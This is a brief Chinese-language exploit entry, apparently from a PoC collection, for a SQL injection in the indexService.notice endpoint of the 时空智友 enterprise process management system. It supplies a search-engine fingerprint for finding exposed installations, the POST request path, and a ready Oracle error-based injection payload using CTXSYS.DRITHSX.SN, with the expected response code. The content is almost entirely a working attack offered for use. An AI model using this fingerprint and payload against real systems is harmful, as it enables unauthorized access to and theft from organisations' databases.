# 时空智友企业流程化管控系统indexService.notice存在SQL注入

时空智友企业流程化管控系统indexService.notice ｜ SQL注入 ｜ —
- **指纹**：`body="时空智友企业信息管理"`
- **请求**：`POST /formservice?service=indexService.notice HTTP/1.1`

**Payload**
```
{"id":"1' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)CHR(122)CHR(112)CHR(118)CHR(113)(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(122)CHR(118)CHR(118)CHR(113)))-- fKEk"}
```
- **响应特征**：200